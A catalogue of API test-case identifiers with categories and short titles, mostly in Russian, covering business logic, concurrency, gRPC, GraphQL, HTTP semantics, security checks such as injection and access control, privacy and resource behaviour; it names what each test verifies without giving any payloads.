BIZ-CURRENCY-MISMATCH | business-logic | Смешение валют в операции обрабатывается явно
BIZ-DOUBLE-SPEND | business-logic | Параллельные списания не приводят к двойной трате
BIZ-EMAIL-LINK-CROSS-SESSION | business-logic | Ссылка-действие из письма работает в другой сессии и после перезапуска сервиса
BIZ-HIERARCHY-CYCLES | business-logic | Ссылка на себя и циклы в иерархии запрещены
BIZ-LIMITS-QUOTAS | business-logic | Лимиты и квоты соблюдаются на границе и не обходятся параллельно
BIZ-NEGATIVE-QUANTITY | business-logic | Отрицательные и нулевые количества и суммы не дают выгоды
BIZ-ONE-TIME-BENEFIT-REUSE | business-logic | Одноразовые промокоды, бонусы и приглашения нельзя использовать повторно
BIZ-ROUNDING | business-logic | Округление денежных величин корректно и не накапливает ошибку
BIZ-SIDE-EFFECTS-ONCE | business-logic | Побочные эффекты (письма, push, события) выполняются ровно один раз
BIZ-TIME-WINDOW | business-logic | Операции вне разрешённого временного окна отклоняются
BIZ-WORKFLOW-STEP-SKIP | business-logic | Нельзя пропустить обязательный шаг бизнес-процесса
COMPAT-ADDITIVE-CHANGE | compatibility | Добавление полей не ломает существующих клиентов
COMPAT-BREAKING-CHANGE-DIFF | compatibility | Изменения контракта проверяются на обратную несовместимость
COMPAT-DEFAULT-VERSION | compatibility | Запрос без указания версии обслуживается задокументированной версией
COMPAT-DEPRECATION-SIGNALS | compatibility | Устаревающие операции помечены Deprecation и Sunset
COMPAT-ENUM-EXTENSION | compatibility | Добавление значения enum не ломает клиентов
COMPAT-IMPLEMENTATION-MATCHES-CONTRACT | compatibility | Реализация соответствует опубликованному контракту
COMPAT-MIXED-VERSION-WRITE-STABILITY | compatibility | Экземпляры разных версий при поэтапном обновлении не перезаписывают общий объект по кругу
COMPAT-UPGRADE-STORED-DATA-STABLE | compatibility | Обновление сервера не меняет сохранённые объекты и не запускает побочных действий
CONC-COUNTER-INCREMENT | concurrency | Счётчики корректны при параллельных инкрементах
CONC-DELETE-VS-UPDATE | concurrency | Параллельные удаление и изменение не оставляют ресурс в противоречивом состоянии
CONC-DOUBLE-SUBMIT | concurrency | Двойная отправка формы не создаёт дубликат операции
CONC-LOST-UPDATE | concurrency | Параллельные изменения не теряют друг друга молча
CONC-PARALLEL-CREATE-UNIQUE | concurrency | Параллельное создание с одним уникальным ключом создаёт один объект
CONC-PARALLEL-INDEPENDENT | concurrency | Параллельные независимые запросы одной операции выполняются без 5xx
CONC-REQUEST-CONTEXT-ISOLATION | concurrency | Параллельные запросы разных пользователей получают только свой контекст и свой ответ
CONC-STATE-TRANSITION-RACE | concurrency | Параллельные переходы состояния не нарушают автомат состояний
CONTRACT-FIELD-SELECTION | contract | Выбор полей возвращает ровно запрошенные поля с правильными значениями
CONTRACT-PUBLISHED-SCHEMA-VALID | contract | Опубликованные сервисом описания API валидны в заявленном диалекте
CONTRACT-REQUIRED-FIELDS | contract | Successful response contains required contract fields
CONTRACT-UNKNOWN-FIELD-POLICY | contract | Unknown fields follow the documented contract policy
ERR-INTERNAL-ERROR-SHAPE | errors | Внутренняя ошибка сервера возвращается в общей модели без утечек
ERR-STABLE-ERROR-CODES | errors | Машиночитаемые коды ошибок стабильны и задокументированы
ERR-STATUS-MATCHES-EFFECT | errors | Код ответа соответствует фактическому результату операции
FILE-ABORTED-UPLOAD-CLEANUP | files | Прерванная загрузка не оставляет данных в хранилище и не учитывается в квоте
FILE-ARCHIVE-BOMB | files | Архивные и графические бомбы не исчерпывают ресурсы
FILE-DOWNLOAD-AUTHZ | files | Скачивание файлов проверяет права и срок действия ссылок
FILE-DOWNLOAD-HEADERS | files | Скачивание отдаёт корректные Content-Type, Content-Disposition и nosniff
FILE-EMPTY-AND-MALFORMED-MULTIPART | files | Пустой файл и некорректный multipart обрабатываются корректно
FILE-FILENAME-SANITIZATION | files | Имя загружаемого файла санитизируется
FILE-MALFORMED-STRUCTURE | files | Повреждённый файл при разборе метаданных даёт 4xx, а не падение процесса
FILE-MALICIOUS-CONTENT | files | Вредоносное содержимое обнаруживается или изолируется
FILE-METADATA-STRIP | files | Метаданные изображений с ПДн удаляются
FILE-MULTIPART-METADATA-SAVED | files | Метаданные из полей multipart сохраняются вместе с файлом
FILE-RANGE-REQUESTS | files | Частичное скачивание через Range работает по контракту
FILE-TRANSFORM-LIMITS | files | Лимит трансформации файла пропускает допустимые комбинации и отклоняет превышение
FILE-TRANSFORM-STORAGE-PARITY | files | Трансформации файла работают на каждом поддерживаемом хранилище
FILE-UPLOAD-KEY-COLLISION | files | Загрузка не перезаписывает чужой файл с тем же именем или ключом хранилища
FILE-UPLOAD-SIZE-LIMIT | files | Лимит размера загружаемого файла соблюдается
FILE-UPLOAD-TYPE-VALIDATION | files | Тип файла проверяется по содержимому, а не только по расширению
GQL-ALIAS-BATCH-ABUSE | graphql | Алиасы и batch-запросы не обходят rate limit
GQL-COMPLEXITY-LIMIT | graphql | Стоимость запроса ограничена (поля, списки, first/last)
GQL-CSRF-GET-MUTATION | graphql | Мутации не выполняются через GET и простые Content-Type
GQL-DEPTH-LIMIT | graphql | Глубина запроса ограничена
GQL-EQUIVALENT-SELECTION-FORMS | graphql | Эквивалентные формы выбора полей GraphQL дают одинаковые данные
GQL-ERRORS-NO-LEAK | graphql | Ошибки GraphQL не раскрывают внутренние детали
GQL-FIELD-LEVEL-AUTHZ | graphql | Авторизация применяется на уровне полей и вложенных резолверов
GQL-FIELD-SUGGESTIONS | graphql | Подсказки «Did you mean» не раскрывают схему при закрытом introspection
GQL-GATEWAY-ROUTING | graphql | В объединённой схеме каждое поле направляется в свой upstream
GQL-INPUT-VALIDATION | graphql | Входные типы и переменные валидируются
GQL-INTROSPECTION | graphql | Introspection отключён или ограничен в продуктиве
GQL-PARTIAL-DATA | graphql | Частичные результаты с ошибками соответствуют спецификации nullability
GQL-REST-ENDPOINT-PARITY | graphql | Операция, опубликованная как REST-эндпоинт, выполняется так же, как исходный GraphQL-запрос
GRPC-BIDI-FLOW-CONTROL | grpc-contract | Двунаправленный стрим соблюдает flow control при медленном клиенте
GRPC-CANCELLATION | grpc-errors | Отмена клиентом прекращает обработку на сервере
GRPC-CLIENT-STREAM-PARTIAL-FAILURE | grpc-contract | Ошибка в середине клиентского стрима обрабатывается по контракту
GRPC-COMPRESSION | grpc-contract | Сжатие сообщений согласуется и неподдерживаемое отклоняется
GRPC-DEADLINE-EXCEEDED | grpc-errors | Превышение дедлайна возвращает DEADLINE_EXCEEDED без побочных эффектов сверх контракта
GRPC-DEADLINE-PROPAGATION | grpc-errors | Дедлайн передаётся в нижележащие вызовы
GRPC-ENUM-UNKNOWN-VALUE | grpc-contract | Неизвестное и нулевое значение enum обрабатывается явно
GRPC-ERROR-DETAILS | grpc-errors | Ошибки содержат структурированные детали google.rpc.Status
GRPC-FIELD-PRESENCE | grpc-contract | Значение по умолчанию отличается от неустановленного поля, где это важно
GRPC-HEALTH-PROTOCOL | grpc-contract | Стандартный health-протокол gRPC реализован корректно
GRPC-JSON-TRANSCODING | grpc-contract | HTTP/JSON транскодирование соответствует proto-аннотациям
GRPC-KEEPALIVE-POLICY | grpc-errors | Агрессивные keepalive-пинги клиента ограничиваются
GRPC-MAX-MESSAGE-SIZE | grpc-contract | Сообщения больше лимита отклоняются RESOURCE_EXHAUSTED
GRPC-METADATA-AUTH-MISSING | grpc-errors | Каждый RPC сервиса требует аутентификационные метаданные
GRPC-METADATA-MALFORMED | grpc-errors | Некорректные и чрезмерные метаданные отклоняются
GRPC-NOT-FOUND-ALREADY-EXISTS | grpc-errors | Отсутствующий и дублирующийся ресурс дают NOT_FOUND и ALREADY_EXISTS
GRPC-ONEOF | grpc-contract | Поля oneof валидируются и не установлены одновременно
GRPC-PRECONDITION-ABORTED | grpc-errors | FAILED_PRECONDITION и ABORTED используются согласно семантике повтора
GRPC-PROTO-BREAKING | grpc-contract | Изменения proto не ломают совместимость wire и JSON
GRPC-REFLECTION-EXPOSURE | grpc-contract | Server reflection отключён или защищён в продуктиве
GRPC-REPEATED-BOUNDARIES | grpc-contract | Repeated и map поля: пусто, много элементов, дубликаты ключей
GRPC-REQUEST-VALIDATION | grpc-contract | Invalid gRPC request is rejected predictably
GRPC-RESOURCE-EXHAUSTED | grpc-errors | Превышение квот возвращает RESOURCE_EXHAUSTED с RetryInfo
GRPC-RETRY-POLICY | grpc-errors | Автоматические повторы применяются только к безопасным методам и статусам
GRPC-SERVER-STREAM-COMPLETE | grpc-contract | Серверный стрим отдаёт все элементы по порядку и завершается OK
GRPC-STATUS-MAPPING | grpc-errors | RPC errors use documented gRPC status codes
GRPC-STREAM-AUTH-EXPIRY | grpc-errors | Длительный стрим учитывает истечение и отзыв токена
GRPC-STREAM-RESOURCE-LIMITS | grpc-errors | Число одновременных стримов и их длительность ограничены
GRPC-STREAM-TERMINATION | grpc-contract | Streaming RPC terminates correctly
GRPC-TLS-MTLS | grpc-errors | Транспорт защищён TLS, при mTLS клиентский сертификат обязателен
GRPC-UNAUTHENTICATED-VS-PERMISSION-DENIED | grpc-errors | Отсутствие аутентификации и отсутствие прав различаются по статусу
GRPC-UNKNOWN-FIELDS | grpc-contract | Неизвестные поля сообщения обрабатываются по политике совместимости
GRPC-WELL-KNOWN-TYPES | grpc-contract | Timestamp, Duration и другие well-known types валидируются по диапазонам
HARD-BACKUP-RESTORE-PROTECTED | security | Восстановление из резервной копии не обходит защиту записи
HARD-BUSINESS-FLOW-AUTOMATION | security | Чувствительные бизнес-потоки защищены от автоматизированного злоупотребления
HARD-CACHE-POISONING | security | Неключевые заголовки не отравляют общий кэш
HARD-CLIENT-IP-TRUSTED-PROXIES | security | IP клиента определяется по цепочке доверенных прокси одинаково на всех маршрутах
HARD-DEBUG-ENDPOINTS | security | Отладочные и служебные эндпоинты недоступны извне
HARD-DENYLIST-EVERY-ENTRY | security | Каждый элемент списка запрещённых значений отклоняется
HARD-EXCESSIVE-DATA-EXPOSURE | security | Ответы не содержат внутренних полей сверх контракта
HARD-EXPENSIVE-OPERATION-LIMITS | security | Дорогие операции ограничены по ресурсам
HARD-HOST-HEADER | security | Подмена Host и X-Forwarded-Host не влияет на ссылки и маршрутизацию
HARD-ID-PREDICTABILITY | security | Предсказуемые идентификаторы не позволяют собрать данные перебором
HARD-IP-ALLOWLIST | security | Ограничение доступа по адресам и подсетям работает на границах для IPv4 и IPv6
HARD-METHOD-OVERRIDE | security | Заголовки переопределения метода не обходят авторизацию
HARD-ROUTE-SHARED-BACKEND-ISOLATION | security | Маршруты шлюза к одному бэкенду применяют каждый свои фильтры
HARD-SENSITIVE-DATA-IN-URL | security | Персональные данные и секреты не передаются в URL
HARD-SETUP-ENDPOINTS-PROTECTED | security | Эндпоинты первоначальной настройки не позволяют захватить экземпляр
HARD-SHADOW-API-VERSIONS | security | Старые версии API и недокументированные маршруты не обходят защиту
HARD-SLOW-CLIENT-LIMITS | security | Медленные и неполные запросы и непрочитанные ответы не накапливаются без ограничения
HARD-TLS-ONLY | security | API доступен только по TLS с актуальными настройками
HARD-UNSAFE-API-CONSUMPTION | security | Ответы сторонних API валидируются перед использованием
HARD-VERSION-DISCLOSURE | security | Ответы не раскрывают версии ПО и инфраструктуры
HARD-WILDCARD-DOMAIN-MATCH | security | Шаблон домена с wildcard совпадает только с поддоменами указанного домена
HTTP-ABSOLUTE-URL-BASE-PATH | http-semantics | Абсолютные URL, которые формирует сервер, учитывают публичный адрес и базовый путь
HTTP-ACCEPT-LANGUAGE | http-semantics | Язык сообщений определяется Accept-Language с fallback
HTTP-BODY-ON-GET-DELETE | http-semantics | Тело в GET/DELETE игнорируется или отклоняется по контракту
HTTP-BODY-WITHOUT-CONTENT-TYPE | http-semantics | Тело без Content-Type обрабатывается предсказуемо
HTTP-COMPRESSION | http-semantics | Сжатие ответа согласуется через Accept-Encoding
HTTP-HEADER-REPEATED-LINES-ACCEPTED | http-semantics | Сотни повторяющихся строк одного заголовка в пределах лимита размера принимаются одинаково по HTTP/1.1 и HTTP/2
HTTP-HEADER-SIZE-LIMIT | http-semantics | Слишком большие заголовки отклоняются контролируемо
HTTP-HTTP2-RESOURCE-LIMITS | http-semantics | Параметры HTTP/2 со стороны клиента не заставляют сервер буферизовать и работать без предела
HTTP-OPTIONS-ALLOW | http-semantics | OPTIONS возвращает согласованный список методов
HTTP-PATH-PREFIX-SEGMENT-BOUNDARY | http-semantics | Правило по префиксу пути соблюдает границу сегмента
HTTP-REQUEST-SMUGGLING | http-semantics | Противоречивые Content-Length и Transfer-Encoding не приводят к request smuggling
HTTP-RESPONSE-FRAMING-HEADERS | http-semantics | Ответ не содержит одновременно Content-Length и Transfer-Encoding
HTTP-RESPONSE-MODE-HEADER-PARITY | http-semantics | Настроенные заголовки ответа присутствуют во всех режимах обработки ответа
HTTP-ROUTE-PROTOCOL-CONDITION | http-semantics | Условие маршрута для одного протокола не блокирует маршрут по другому разрешённому протоколу
HTTP-TRAILING-SLASH-CASE | http-semantics | Вариации пути (слэш в конце, регистр, двойной слэш) обрабатываются единообразно
HTTP-UNKNOWN-ROUTE | http-semantics | Неизвестный маршрут возвращает 404, а не 5xx или 200
HTTP-URL-LENGTH-LIMIT | http-semantics | Очень длинный URL отклоняется контролируемо
HTTP-VARY-HEADER | http-semantics | Кэшируемые ответы содержат корректный Vary
HTTP-VERSION-PARITY | http-semantics | Запросы по HTTP/2 и с предложением Upgrade h2c обслуживаются так же, как по HTTP/1.1
HTTP-WWW-AUTHENTICATE-SYNTAX | http-semantics | Заголовок WWW-Authenticate в ответе 401 соответствует синтаксису RFC
INJ-ARCHIVE-ENTRY-NAME-EVAL | security | Имена файлов внутри загруженного репозитория или архива не исполняются как код
INJ-CSV-FORMULA | security | Экспорт в CSV/XLSX нейтрализует формулы
INJ-FILTER-EXPRESSION | security | Выражения фильтрации (OData, RSQL, JSONPath, GraphQL where) не позволяют выйти за ограничения
INJ-HEADER-CRLF | security | CRLF в значениях не позволяет внедрять заголовки ответа
INJ-LLM-GENERATED-ACTIONS | security | Код и вызовы инструментов, сгенерированные LLM по вводу пользователя, не выполняют опасных действий
INJ-LOG-FORGING | security | Пользовательские данные не позволяют подделывать записи журналов
INJ-NOSQL | security | NoSQL-инъекция операторами запросов не исполняется
INJ-OS-COMMAND | security | Инъекция команд ОС не исполняется
INJ-PATH-TRAVERSAL | security | Обход каталогов через параметры файлов и путей невозможен
INJ-PROTOTYPE-POLLUTION | security | Специальные ключи __proto__ и constructor не меняют поведение сервера
INJ-REDOS | security | Пользовательский ввод не вызывает катастрофический backtracking в regex
INJ-REFLECTED-XSS | security | Параметры запроса не отражаются в HTML-ответе без экранирования
INJ-RESERVED-PATH-WRITE | security | Запись файлов через API не попадает в служебные каталоги
INJ-SQL | security | SQL-инъекция во входных параметрах не исполняется
INJ-SSRF-PARAMETERS | security | Параметры с URL и хостами не дают доступа к внутренней сети
INJ-STORED-XSS | security | Сохранённые данные с HTML/JS не создают XSS у потребителей API
INJ-TEMPLATE-SSTI | security | Инъекция в серверные шаблоны не исполняется
INJ-UNSAFE-DESERIALIZATION | security | Небезопасная десериализация пользовательских данных невозможна
INJ-USER-CODE-EXECUTION | security | Пользовательский код, исполняемый сервером, не получает доступа к ОС, файлам и сети
INJ-XXE | security | Внешние сущности XML не обрабатываются
OBS-AUDIT-TRAIL | observability | Чувствительные действия фиксируются в журнале аудита
OBS-CONFIG-ENDPOINT-ACCURATE | observability | Служебный эндпоинт конфигурации показывает фактические значения
OBS-HEALTH-ENDPOINTS | observability | Health-эндпоинты отражают состояние и не раскрывают детали
OBS-METRICS-LABEL-CARDINALITY | observability | Значения из запроса не создают неограниченно новых серий метрик
OBS-NO-SECRETS-IN-LOGS | observability | Логи не содержат паролей, токенов и ПДн в открытом виде
OBS-REQUEST-LOG-ALL-ATTEMPTS | observability | Журнал запроса с повторами содержит каждую попытку, включая последнюю
OBS-TELEMETRY-FORMAT | observability | Экспортируемая телеметрия соответствует документированной структуре и соглашениям OpenTelemetry
OBS-TRACE-PROPAGATION | observability | Контекст трассировки принимается и передаётся дальше
PAGE-BEYOND-LAST | pagination | Запрос страницы за последней возвращает пустой результат без ошибки
PAGE-CONCURRENT-MODIFICATION | pagination | Изменения коллекции во время обхода не приводят к дублям и пропускам сверх контракта
PAGE-CURSOR-TAMPERING | pagination | Подделанный или чужой курсор пагинации не раскрывает данные
PAGE-NEXT-LINK-VALID | pagination | Ссылка next ведёт на ту же коллекцию, сохраняет фильтры и работает
PAGE-SEARCH-SPECIAL-CHARS | pagination | Поиск со спецсимволами и wildcard не ломается и не расширяет выборку
PAGE-SORT-MULTI-KEY-PRIORITY | pagination | Сортировка по нескольким ключам соблюдает заданный клиентом порядок приоритета
PAGE-SORT-NULLS-TIES | pagination | Сортировка по полю с null и одинаковыми значениями детерминирована
PAGE-TOTAL-COUNT | pagination | Общее число элементов согласовано с суммой страниц
PERF-DEEP-PAGINATION | performance | Глубокая пагинация и большие выборки не деградируют неприемлемо
PERF-LATENCY-BASELINE | performance | Задержка ключевых операций в пределах SLO при обычной нагрузке
PERF-LOAD-THROUGHPUT | performance | Сервис выдерживает целевую нагрузку
PERF-NO-UNNEEDED-DEPENDENCY-CALLS | performance | Внешняя зависимость вызывается только когда её результат нужен
PERF-PAYLOAD-SIZE | performance | Размер ответов разумен и не растёт неограниченно
PERF-SOAK | performance | Длительная нагрузка не вызывает утечек и деградации
PERF-SPIKE | performance | Резкий всплеск нагрузки обрабатывается деградацией, а не отказом
PRIV-CONSENT-ENFORCEMENT | privacy | Обработка, требующая согласия, не выполняется без него
PRIV-DATA-MASKING | privacy | Чувствительные данные маскируются в ответах по политике
PRIV-ERASURE | privacy | Удаление персональных данных по запросу выполняется полностью
PRIV-IMPORT-URL-CREDENTIALS-NOT-STORED | privacy | Учётные данные из URL источника импорта не сохраняются после завершения импорта
PRIV-RESPONSE-FOREIGN-DATA | privacy | Ответ не содержит фрагментов данных других запросов и памяти процесса
PRIV-SELF-DATA-EXPORT | privacy | Экспорт собственных данных содержит только данные пользователя
REAL-BFF-ADMIN-API-AUDITCONTROLLER-GETENTRIES-OPERATION-ACCESS-PO | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-AUTHCONTROLLER-CHANGEPASSWORD-MISSING-OR-INVAL | security | Cookie-authenticated endpoint rejects missing/invalid session
REAL-BFF-ADMIN-API-AUTHCONTROLLER-CHANGEPASSWORD-ROLE-MODEL-UNRES | security | Confirm minimum privilege policy for sensitive operation
REAL-BFF-ADMIN-API-AUTHCONTROLLER-CHANGEPASSWORD-WRONG-CURRENT-PA | security | Password change verifies current password
REAL-BFF-ADMIN-API-AUTHCONTROLLER-DELETESESSION-CROSS-ACCOUNT-SES | security | Session endpoint enforces session ownership
REAL-BFF-ADMIN-API-AUTHCONTROLLER-DELETESESSION-MISSING-OR-INVALI | security | Cookie-authenticated endpoint rejects missing/invalid session
REAL-BFF-ADMIN-API-AUTHCONTROLLER-DELETESESSION-ROLE-MODEL-UNRESO | security | Confirm minimum privilege policy for sensitive operation
REAL-BFF-ADMIN-API-AUTHCONTROLLER-GETSESSIONS-CROSS-ACCOUNT-SESSI | security | Session endpoint enforces session ownership
REAL-BFF-ADMIN-API-AUTHCONTROLLER-GETSESSIONS-MISSING-OR-INVALID | security | Cookie-authenticated endpoint rejects missing/invalid session
REAL-BFF-ADMIN-API-AUTHCONTROLLER-LOGIN-INVALID-CREDENTIALS | security | Login rejects invalid credentials
REAL-BFF-ADMIN-API-AUTHCONTROLLER-LOGOUT-MISSING-OR-INVALID-COOKI | security | Cookie-authenticated endpoint rejects missing/invalid session
REAL-BFF-ADMIN-API-AUTHCONTROLLER-LOGOUT-ROLE-MODEL-UNRESOLVED | security | Confirm minimum privilege policy for sensitive operation
REAL-BFF-ADMIN-API-COMPONENTTYPESCONTROLLER-GETTYPES-OPERATION-AC | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-CONTENTCONTROLLER-CREATEITEM-OPERATION-ACCESS | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-CONTENTCONTROLLER-CREATEITEM-ROLE-MODEL-UNRESO | security | Confirm minimum privilege policy for sensitive operation
REAL-BFF-ADMIN-API-CONTENTCONTROLLER-GETITEMS-OPERATION-ACCESS-PO | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-CONTENTCONTROLLER-GETSOURCES-OPERATION-ACCESS | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-CONTENTCONTROLLER-REMOVEITEM-OPERATION-ACCESS | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-CONTENTCONTROLLER-REMOVEITEM-ROLE-MODEL-UNRESO | security | Confirm minimum privilege policy for sensitive operation
REAL-BFF-ADMIN-API-CONTENTCONTROLLER-UPDATEITEM-OPERATION-ACCESS | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-CONTENTCONTROLLER-UPDATEITEM-ROLE-MODEL-UNRESO | security | Confirm minimum privilege policy for sensitive operation
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-ARCHIVE-OPERATION-ACCESS-POL | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-ARCHIVE-ROLE-MODEL-UNRESOLVE | security | Confirm minimum privilege policy for sensitive operation
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-GETCURRENTVERSIONS-OPERATION | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-GETLANGUAGES-OPERATION-ACCES | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-GETNODES-OPERATION-ACCESS-PO | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-GETSCREEN-OPERATION-ACCESS-P | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-GETSCREENS-OPERATION-ACCESS | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-GETVERSIONS-OPERATION-ACCESS | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-PUBLISH-OPERATION-ACCESS-POL | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-PUBLISH-ROLE-MODEL-UNRESOLVE | security | Confirm minimum privilege policy for sensitive operation
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-SAVETRANSLATION-OPERATION-AC | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-SAVETRANSLATION-ROLE-MODEL-U | security | Confirm minimum privilege policy for sensitive operation
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-TOGGLELANGUAGE-OPERATION-ACC | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-TOGGLELANGUAGE-ROLE-MODEL-UN | security | Confirm minimum privilege policy for sensitive operation
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-UPDATECOMPONENT-OPERATION-AC | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-UPDATECOMPONENT-ROLE-MODEL-U | security | Confirm minimum privilege policy for sensitive operation
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-VALIDATE-OPERATION-ACCESS-PO | security | Confirm operation-specific authentication and authorization policy
REAL-BFF-ADMIN-API-LAYOUTSCONTROLLER-VALIDATE-ROLE-MODEL-UNRESOLV | security | Confirm minimum privilege policy for sensitive operation
REAL-MOBILE-CLIENT-API-ACCEPTDOCUMENTS-CROSS-PRINCIPAL-OR-STALE-R | security | Document acceptance is bound to the correct principal and revision
REAL-MOBILE-CLIENT-API-ACCEPTDOCUMENTS-GUEST-VS-AUTHENTICATED | security | Guest and authenticated document access follow distinct policies
REAL-MOBILE-CLIENT-API-GETDOCUMENTSHISTORY-GUEST-VS-AUTHENTICATED | security | Guest and authenticated document access follow distinct policies
REAL-MOBILE-CLIENT-API-GETUNSIGNEDDOCUMENTS-GUEST-VS-AUTHENTICATE | security | Guest and authenticated document access follow distinct policies
REAL-MOBILE-CLIENT-API-LOGOUT-MISSING-EXPIRED-OR-REFRESH-TOKEN | security | Logout requires a valid access token
REAL-MOBILE-CLIENT-API-ONSTART-ANONYMOUS-VS-API-KEY | security | Startup endpoint matches the documented API-key policy
REAL-MOBILE-CLIENT-API-REFRESH-EXPIRED-OR-INVALID-REFRESH-TOKEN | security | Authentication endpoint rejects invalid credentials
REAL-MOBILE-CLIENT-API-SENDCODE-INVALID-API-KEY | security | Authentication endpoint rejects invalid credentials
REAL-MOBILE-CLIENT-API-VERIFYCODE-INVALID-API-KEY | security | Authentication endpoint rejects invalid credentials
REQ-CONTRACT-CONTRADICTS-SPEC | requirements | Поведение по контракту не противоречит ТЗ
REQ-CONTRACT-SELF-CONSISTENCY | requirements | Контракт не противоречит сам себе и своей прежней версии
REQ-CROSS-CLIENT-CONSISTENCY | requirements | Одно правило продукта одинаково в API разных клиентов
REQ-SPEC-NOT-IN-CONTRACT | requirements | Требование ТЗ не потеряно по пути в контракт и реализацию
REQ-UNSPECIFIED-BEHAVIOR-PROBE | requirements | Неописанное поведение выясняется тестом и сравнивается со стандартом и здравым смыслом
RES-ALLOCATED-VALUE-RELEASE | resources | Выделенное из пула значение не выдаётся повторно, пока прежний владелец не удалён окончательно
RES-ARCHIVE-RESTORE | resources | Архивирование и восстановление сохраняют данные и связи
RES-BULK-LIMITS | resources | Массовые операции соблюдают лимиты и сообщают о каждом элементе
RES-CACHE-EXPLICIT-INVALIDATION | resources | Явный сброс кэша через API удаляет закэшированные ответы
RES-CACHE-KEY-COMPLETENESS | resources | Серверный кэш различает ответы по всем значимым параметрам и по типу ресурса
RES-CREATE-RESPONSE-MATCHES-READ | resources | Ответ на создание и изменение совпадает с последующим чтением
RES-CRUD-CYCLE | resources | Полный жизненный цикл ресурса: создание, чтение, изменение, удаление
RES-DB-OBJECT-NAMES | resources | API по схеме БД работает с объектами в любом регистре, со спецсимволами и зарезервированными именами
RES-DELETE-WITH-DEPENDENTS | resources | Удаление ресурса с зависимыми объектами выполняется по правилам каскада
RES-DRAFT-PUBLISH-FIDELITY | resources | Публикация черновика переносит все изменения и не ломает связи других объектов
RES-EXPORT-IMPORT-ROUNDTRIP | resources | Данные, выгруженные API, принимаются им же обратно без изменений
RES-IMMUTABLE-FIELDS | resources | Неизменяемые поля нельзя изменить после создания
RES-LARGE-RELATION-SET | resources | Тысячи связанных объектов не дают 5xx из-за лимитов СУБД на параметры запроса
RES-LIST-REFLECTS-CHANGES | resources | Списки и счётчики отражают создание, изменение и удаление
RES-READ-AFTER-WRITE | resources | Чтение после записи соответствует модели согласованности
RES-REFERENTIAL-INTEGRITY | resources | Ссылка на несуществующий или чужой связанный ресурс отклоняется
RES-RELATION-NULL-TARGET-ROWS | resources | Связь многие-ко-многим возвращает записи связующей таблицы с пустой ссылкой
RES-RELATION-ORDER-STABLE | resources | Изменение связанного ресурса не меняет ручной порядок связей у другой стороны
RES-RELATIONS-SHARED-JUNCTION-ISOLATION | resources | Связи через общую связующую таблицу возвращают каждая только свои данные
RES-SERVER-GENERATED-FIELDS | resources | Клиент не может задать серверные поля (id, createdAt, status, version)
RES-SOFT-DELETE-VISIBILITY | resources | Мягко удалённые ресурсы не видны в обычных операциях
RES-SYSTEM-OBJECT-PROTECTED | resources | Встроенные системные объекты защищены от удаления и изменения при любой конфигурации
RES-TIMESTAMPS | resources | Метки времени создания и изменения ведут себя корректно
RES-UNIQUENESS-NORMALIZATION | resources | Уникальность не обходится вариациями значения
RES-UPDATE-MISSING | resources | Изменение несуществующего ресурса не создаёт его неявно
RESIL-BROKER-DOWN | resilience | Недоступность брокера сообщений не теряет события
RESIL-CIRCUIT-BREAKER | resilience | Circuit breaker размыкается и восстанавливается по политике
RESIL-DEPENDENCY-DOWN | resilience | Недоступность зависимости даёт контролируемую ошибку
RESIL-DEPENDENCY-TLS-RECOVERY | resilience | Проверка доступности внешнего бэкенда проверяет его сертификат и восстанавливается без перезапуска
RESIL-ENCRYPTION-KEY-ROTATION | resilience | Нерасшифровываемое после смены ключа значение не ломает чтение и сохранение остальных данных
RESIL-GRACEFUL-SHUTDOWN | resilience | Перезапуск экземпляра не обрывает выполняющиеся запросы
RESIL-PARTIAL-DEGRADATION | resilience | Отказ некритичной зависимости не ломает основной функционал
RESIL-TLS-CERT-RELOAD | resilience | Сервер подхватывает заменённый TLS-сертификат без перезапуска
RESOURCE-CREATE-READ | resources | Created resource can be read back
RESOURCE-READ-MISSING | resources | Reading a missing resource returns a documented error
REST-204-NO-BODY | contract | Ответ 204 без тела
REST-ACCEPT-NEGOTIATION | contract | Согласование Accept
REST-API-VERSION-COMPATIBILITY | contract | Совместимость версий API
REST-ASYNC-202 | contract | Асинхронное принятие задачи 202
REST-AUTH-ERROR-NO-LEAK | security | Ошибки аутентификации без утечки
REST-BATCH-PARTIAL-FAILURE | contract | Частичный сбой batch
REST-CACHE-CONDITIONAL-GET | contract | ETag/Last-Modified conditional GET
REST-CONCURRENT-UPDATE | resilience | Конкурентное обновление
REST-CONTENT-TYPE-JSON | contract | Content-Type и JSON-формат
REST-CORRELATION-ID | errors | Correlation ID
REST-CORS-POLICY | security | Политика CORS
REST-DATE-TIME-TZ | validation | Дата, время и timezone
REST-DECIMAL-PRECISION | resources | Точность decimal
REST-DELETE-REPEAT | contract | Повторное удаление
REST-DUPLICATE-UNIQUE-KEY | resources | Дублирование уникального ключа
